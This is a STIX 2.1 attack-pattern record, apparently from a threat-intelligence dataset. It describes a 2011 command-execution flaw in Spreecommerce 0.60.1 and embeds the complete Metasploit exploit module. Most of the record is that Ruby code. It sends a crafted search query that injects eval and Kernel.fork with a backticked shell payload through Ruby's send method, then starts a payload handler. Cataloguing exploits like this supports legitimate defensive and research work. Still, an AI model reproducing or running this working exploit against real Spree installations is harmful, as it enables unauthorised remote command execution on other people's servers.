{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7005ea5-be7c-47e3-8c0d-87e9804ba62d",
    "created": "2024-08-14T17:07:39.735219Z",
    "modified": "2024-08-14T17:07:39.735223Z",
    "name": "Spreecommerce 0.60.1 Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Spreecommerce search. Unvalidated input is called via the Ruby send method allowing command execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/spree_search_exec.rb",
            "external_id": "spree_search_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://spreecommerce.com/blog/2011/10/05/remote-command-product-group/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Spreecommerce 0.60.1 Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n          Spreecommerce search. Unvalidated input is called via the\n          Ruby send method allowing command execution.\n      },\n      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '76011'],\n          [ 'URL', 'http://spreecommerce.com/blog/2011/10/05/remote-command-product-group/' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x60\",\n          'DisableNops' => true,\n          'Space'       => 31337,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n            }\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2011-10-05',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"The path to the Spreecommerce main site\", \"/\"]),\n        ])\n  end\n\n  def exploit\n    command = Rex::Text.uri_encode(payload.raw, 'hex-noslashes')\n    res = send_request_raw({\n      'uri'     => normalize_uri(datastore['URI']) + \"?search[send][]=eval&search[send][]=Kernel.fork%20do%60#{command}%60end\",\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close',\n      }\n    }, 0.4 ) #short timeout, we don't care about the response\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-05",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}